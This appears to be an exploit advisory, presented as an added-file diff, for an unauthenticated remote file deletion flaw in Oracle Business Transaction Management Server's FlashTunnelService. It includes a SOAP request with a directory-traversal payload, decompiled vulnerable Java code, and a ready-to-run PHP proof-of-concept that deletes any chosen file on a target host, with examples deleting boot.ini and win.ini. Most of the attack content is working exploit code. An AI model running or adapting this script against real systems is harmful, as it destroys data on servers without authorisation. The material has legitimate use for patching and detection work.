@@ -1,0 +1,171 @@
+Oracle Business Transaction Management Server 12.1.0.2.7 FlashTunnelService 
+Remote File Deletion
+
+tested against: Microsoft Windows Server 2003 r2 sp2
+                Oracle WebLogic Server 12c (12.1.1)
+                Oracle Business Transaction Management Server 12.1.0.2.7 (Production version)
+
+files tested: 
+oepe-indigo-installer-12.1.1.0.1.201203120349-12.1.1-win32.exe (weblogic)
+download url: http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html              
+
+BTM_Servers_12.1.0.2.7.zip (BTM, production version) 
+download url: http://www.oracle.com/technetwork/oem/downloads/btw-downloads-207704.html
+
+
+vulnerability:
+the mentioned product installs a web service 
+called "FlashTunnelService" which can be reached
+without prior authentication and processes incoming
+SOAP requests.
+
+It can be reached at the following uri:
+http://[host]:7001/btmui/soa/flash_svc/
+
+This soap interface exposes the 'deleteFile' function
+which could allow to delete arbitrary files with administrative
+privileges on the target
+server through a directory traversal vulnerability.
+This could be useful for further attacks.
+
+Example packet:
+
+POST /btmui/soa/flash_svc/ HTTP/1.1
+Accept-Encoding: gzip,deflate
+Content-Type: text/xml;charset=UTF-8
+SOAPAction: "http://soa.amberpoint.com/deleteFile"
+User-Agent: Jakarta Commons-HttpClient/3.1
+Host: [host]:7001
+Content-Length: [length]
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:int="http://schemas.amberpoint.com/flashtunnel/interfaces" xmlns:typ="http://schemas.amberpoint.com/flashtunnel/types">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <int:deleteFileRequest>
+         <int:deleteFile handle="../../../../../../../../../../../../somepath/somefile.ext">
+            <typ:DeleteFileRequestVersion>
+            </typ:DeleteFileRequestVersion>
+         </int:deleteFile>
+      </int:deleteFileRequest>
+   </soapenv:Body>
+</soapenv:Envelope>
+
+Vulnerable code, see the decompiled com.amberpoint.flashtunnel.impl.FlashTunnelServiceImpl class:
+...
+public IDeleteFileResponse deleteFile(IDeleteFileRequest request)
+        throws SOAPFaultException
+    {
+        DeleteFileResponse dfr = new DeleteFileResponse();
+        String handle = request.getHandle();
+        File f = getFileFromHandle(handle);
+        if(f != null)
+            f.delete();
+        return dfr;
+    }
+...
+
+As attachment, proof of concept code.
+
+<?php
+/*
+Oracle Business Transaction Management Server 12.1.0.2.7 FlashTunnelService 
+Remote File Deletion poc
+
+tested against: Microsoft Windows Server 2003 r2 sp2
+                Oracle WebLogic Server 12c (12.1.1)
+                Oracle Business Transaction Management Server 12.1.0.2.7 (Production version)
+
+Example:
+C:\php>php 9sg_ora2.php 192.168.2.101 boot.ini
+
+C:\php>php 9sg_ora2.php 192.168.2.101 windows\system32\win.ini
+
+rgod
+*/
+    error_reporting(E_ALL ^ E_NOTICE);     
+    set_time_limit(0);
+    
+	$err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    
+	function syntax() {
+       print("usage: php 9sg_ora2.php [ip_address] [file_to_delete]\r\n" );
+       die();
+    }
+    
+	$argv[2] ? print("[*] Attacking...\n") :
+    syntax();
+    
+	if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        }
+    }
+        
+    function _s($url, $is_post, $ck, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post == 1) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        if ($is_post == 2) {
+            curl_setopt($ch, CURLOPT_PUT, 1); 
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "Content-Type: text/xml;charset=UTF-8",
+            "SOAPAction: \"http://soa.amberpoint.com/deleteFile\"",
+                      
+
+        )); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Jakarta Commons-HttpClient/3.1");
+        //curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        //curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
+         
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            //die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+          $host = $argv[1];
+          $port = 7001;
+          $file = $argv[2];
+
+$soap='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:int="http://schemas.amberpoint.com/flashtunnel/interfaces" xmlns:typ="http://schemas.amberpoint.com/flashtunnel/types">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <int:deleteFileRequest>
+         <int:deleteFile handle="../../../../../../../../../../../../../../../../../../'.$file.'">
+            <typ:DeleteFileRequestVersion>
+            </typ:DeleteFileRequestVersion>
+         </int:deleteFile>
+      </int:deleteFileRequest>
+   </soapenv:Body>
+</soapenv:Envelope>';
+
+$url = "http://$host:$port/btmui/soa/flash_svc/";
+$out = _s($url, 1, "", $soap);
+print($out."\n");
+?>
